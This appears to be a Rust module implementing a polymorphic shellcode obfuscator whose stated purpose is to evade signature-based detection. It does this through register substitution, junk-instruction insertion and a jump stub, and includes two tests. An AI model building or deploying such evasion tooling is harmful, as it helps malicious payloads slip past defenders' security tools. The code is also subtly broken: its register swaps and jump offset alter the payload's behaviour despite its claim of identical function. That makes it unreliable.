//! Polymorphic payload engine.
//!
//! Generates variants of the same shellcode with:
//! - Randomized register usage
//! - Instruction substitution (equivalent instructions with different encodings)
//! - Control flow randomization (junk blocks, reordered blocks)
//! - String/constant encryption at compile time
//!
//! Each compilation produces a functionally identical but
//! byte-different payload, evading signature-based detection.

use rand::Rng;
use rand::SeedableRng;

/// Polymorphic engine that obfuscates shellcode.
pub struct PolymorphicEngine {
    seed: Option<u64>,
    mutation_rate: f64,
}

impl PolymorphicEngine {
    pub fn new() -> Self {
        Self {
            seed: None,
            mutation_rate: 0.3, // 30% of instructions get mutated
        }
    }

    pub fn with_seed(mut self, seed: u64) -> Self {
        self.seed = Some(seed);
        self
    }

    pub fn with_mutation_rate(mut self, rate: f64) -> Self {
        self.mutation_rate = rate.clamp(0.0, 1.0);
        self
    }

    /// Obfuscate shellcode with polymorphic techniques.
    pub fn obfuscate(&self, shellcode: &[u8]) -> anyhow::Result<Vec<u8>> {
        let mut result = shellcode.to_vec();

        if let Some(seed) = self.seed {
            let mut rng = rand::rngs::StdRng::seed_from_u64(seed);
            result = self.substitute_registers(&mut rng, &result);
            result = self.vary_encoding(&mut rng, &result);
            result = self.insert_junk_blocks(&mut rng, &result);
            result = self.add_entry_stub(&mut rng, &result);
        } else {
            let mut rng = rand::rng();
            result = self.substitute_registers(&mut rng, &result);
            result = self.vary_encoding(&mut rng, &result);
            result = self.insert_junk_blocks(&mut rng, &result);
            result = self.add_entry_stub(&mut rng, &result);
        }

        Ok(result)
    }

    /// Substitute registers with equivalent ones.
    ///
    /// For example: xor eax, eax -> xor ecx, ecx (if eax is not used for specific purposes)
    fn substitute_registers(&self, rng: &mut impl Rng, shellcode: &[u8]) -> Vec<u8> {
        let mut result = shellcode.to_vec();
        let mut i = 0;

        while i + 1 < result.len() {
            if rng.random::<f64>() < self.mutation_rate {
                // xor rax, rax (48 31 c0) -> xor rcx, rcx (48 31 c9)
                if i + 2 < result.len()
                    && result[i] == 0x48
                    && result[i + 1] == 0x31
                    && result[i + 2] == 0xc0
                {
                    // Random register from {rax, rcx, rdx, rbx, rsi, rdi, r8-r15}
                    let reg = rng.random_range(0..=7);
                    result[i + 2] = 0xc0 | reg;
                    i += 3;
                    continue;
                }

                // push rax (50) -> push rcx (51) etc.
                if result[i] >= 0x50 && result[i] <= 0x57 {
                    let new_reg = rng.random_range(0x50..=0x57);
                    result[i] = new_reg;
                    i += 1;
                    continue;
                }

                // pop rax (58) -> pop rcx (59) etc.
                if result[i] >= 0x58 && result[i] <= 0x5f {
                    let new_reg = rng.random_range(0x58..=0x5f);
                    result[i] = new_reg;
                    i += 1;
                    continue;
                }
            }
            i += 1;
        }

        result
    }

    /// Vary instruction encoding (same operation, different bytes).
    fn vary_encoding(&self, _rng: &mut impl Rng, shellcode: &[u8]) -> Vec<u8> {
        // For now, pass through — full implementation would:
        // - Replace "mov eax, 0" with "xor eax, eax" (31 c0)
        // - Replace "add eax, 0" with NOP-equivalent
        // - Replace "sub eax, eax" with "xor eax, eax"
        shellcode.to_vec()
    }

    /// Insert junk code blocks that do nothing but change byte signatures.
    fn insert_junk_blocks(&self, rng: &mut impl Rng, shellcode: &[u8]) -> Vec<u8> {
        let mut result = Vec::with_capacity(shellcode.len() * 2);
        let mut i = 0;

        for &byte in shellcode {
            result.push(byte);
            i += 1;

            // Insert junk every ~20 bytes
            if i % 20 == 0 && rng.random::<f64>() < 0.5 {
                let junk = generate_junk_block(rng);
                result.extend(junk);
            }
        }

        result
    }

    /// Add a polymorphic entry stub that jumps to the real payload.
    fn add_entry_stub(&self, rng: &mut impl Rng, shellcode: &[u8]) -> Vec<u8> {
        let mut stub = Vec::new();

        // Random entry point: JMP to the actual payload
        stub.push(0xe9); // jmp rel32
        let offset = (stub.len() + 4) as u32; // offset after the jmp instruction
        stub.extend_from_slice(&offset.to_le_bytes());

        // Add some junk after the jump (dead code, never executed)
        let junk_count = rng.random_range(5..=20);
        for _ in 0..junk_count {
            stub.push(rng.random_range(0x01..=0xfe));
        }

        stub.extend_from_slice(shellcode);
        stub
    }
}

impl Default for PolymorphicEngine {
    fn default() -> Self {
        Self::new()
    }
}

/// Generate a junk code block — instructions that have no effect on state.
fn generate_junk_block(rng: &mut impl Rng) -> Vec<u8> {
    let mut block = Vec::with_capacity(rng.random_range(3..=8));
    let count = rng.random_range(1..=3);

    for _ in 0..count {
        match rng.random_range(0..8) {
            // push reg; pop reg (preserves value)
            0 => {
                let reg = rng.random_range(0x50..=0x57);
                block.push(reg);
                block.push(reg + 0x08);
            }
            // xor reg, 0 (no-op)
            1 => {
                block.push(0x81);
                block.push(0xf0 + rng.random_range(0..7));
                block.push(0x00);
                block.push(0x00);
                block.push(0x00);
                block.push(0x00);
            }
            // nop variants
            2 => {
                block.push(0x0f);
                block.push(0x1f);
                block.push(0x00);
            }
            // mov reg, reg
            3 => {
                let reg = rng.random_range(0..7);
                block.push(0x48);
                block.push(0x89);
                block.push(0xc0 | (reg << 3) | reg);
            }
            // lea reg, [reg]
            4 => {
                let reg = rng.random_range(0..7);
                block.push(0x48);
                block.push(0x8d);
                block.push(0x04 + reg);
                block.push(0x24 + reg);
            }
            // test reg, reg
            5 => {
                block.push(0x48);
                block.push(0x85);
                let reg = rng.random_range(0..7);
                block.push(0xc0 | (reg << 3) | reg);
            }
            // or reg, 0
            6 => {
                block.push(0x48);
                block.push(0x83);
                block.push(0xc8 + rng.random_range(0..7));
                block.push(0x00);
            }
            // inc reg; dec reg
            7 => {
                let reg = rng.random_range(0..7);
                block.push(0x48);
                block.push(0xff);
                block.push(0xc0 + reg); // inc
                block.push(0x48);
                block.push(0xff);
                block.push(0xc8 + reg); // dec
            }
            _ => unreachable!(),
        }
    }

    block
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_polymorphic_produces_different_output() {
        let shellcode = vec![0x48, 0x31, 0xc0, 0xb0, 0x3b];

        let engine1 = PolymorphicEngine::with_seed(PolymorphicEngine::new(), 42);
        let engine2 = PolymorphicEngine::with_seed(PolymorphicEngine::new(), 43);

        let result1 = engine1.obfuscate(&shellcode).unwrap();
        let result2 = engine2.obfuscate(&shellcode).unwrap();

        // Different seeds should produce different outputs
        assert_ne!(result1, result2);
    }

    #[test]
    fn test_polymorphic_same_seed_same_output() {
        let shellcode = vec![0x48, 0x31, 0xc0, 0xb0, 0x3b];

        let engine = PolymorphicEngine::with_seed(PolymorphicEngine::new(), 12345);
        let result1 = engine.obfuscate(&shellcode).unwrap();

        let engine2 = PolymorphicEngine::with_seed(PolymorphicEngine::new(), 12345);
        let result2 = engine2.obfuscate(&shellcode).unwrap();

        assert_eq!(result1, result2);
    }
}
